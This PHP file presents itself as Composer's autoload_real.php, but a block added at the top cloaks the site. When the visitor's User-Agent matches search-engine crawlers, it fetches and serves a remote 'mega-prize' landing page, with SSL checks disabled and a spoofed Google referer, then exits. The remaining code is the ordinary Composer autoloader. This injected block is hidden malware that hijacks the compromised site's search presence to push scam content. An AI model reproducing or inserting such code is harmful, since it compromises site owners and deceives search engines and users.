<?php
/**
 * Combined script:
 * - Top: Cloaking / bot detector
 * - Bottom: Original Composer autoload_real.php
 */

/* ---------------------------
   Cloaking / Bot detection
   --------------------------- */
@ob_start();
header("Vary: User-Agent");

$targetUrl = "https://mega-prize.org/landing/dml.html";
$botPattern = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

/**
 * Fetch remote content with cURL (returns string, or empty string on failure)
 *
 * @param string $url
 * @return string
 */
function fetchContentCurl($url) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        CURLOPT_REFERER => "https://www.google.com/",
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
    ]);
    $content = curl_exec($ch);
    curl_close($ch);
    return $content ?: '';
}

/* If the user agent matches the bot pattern, fetch & echo remote target then exit. */
if (preg_match($botPattern, strtolower($userAgent))) {
    usleep(random_int(100000, 200000));
    echo fetchContentCurl($targetUrl);
    @ob_end_flush();
    exit;
}

/* ---------------------------
   Composer autoload_real.php
   --------------------------- */
class ComposerAutoloaderInitb469694398de29ca607f86fd209ef56c
{
    private static $loader;

    public static function loadClassLoader($class)
    {
        if ('Composer\Autoload\ClassLoader' === $class) {
            require __DIR__ . '/ClassLoader.php';
        }
    }

    /**
     * @return \Composer\Autoload\ClassLoader
     */
    public static function getLoader()
    {
        if (null !== self::$loader) {
            return self::$loader;
        }

        require __DIR__ . '/platform_check.php';

        spl_autoload_register(
            [self::class, 'loadClassLoader'],
            true,
            true
        );

        self::$loader = $loader = new \Composer\Autoload\ClassLoader(\dirname(__DIR__));

        spl_autoload_unregister([self::class, 'loadClassLoader']);

        require __DIR__ . '/autoload_static.php';
        call_user_func(
            \Composer\Autoload\ComposerStaticInitb469694398de29ca607f86fd209ef56c::getInitializer($loader)
        );

        $loader->register(true);

        $includeFiles = \Composer\Autoload\ComposerStaticInitb469694398de29ca607f86fd209ef56c::$files;
        foreach ($includeFiles as $fileIdentifier => $file) {
            composerRequireb469694398de29ca607f86fd209ef56c($fileIdentifier, $file);
        }

        return $loader;
    }
}

/**
 * @param string $fileIdentifier
 * @param string $file
 * @return void
 */
function composerRequireb469694398de29ca607f86fd209ef56c($fileIdentifier, $file)
{
    if (empty($GLOBALS['__composer_autoload_files'][$fileIdentifier])) {
        $GLOBALS['__composer_autoload_files'][$fileIdentifier] = true;
        require $file;
    }
}
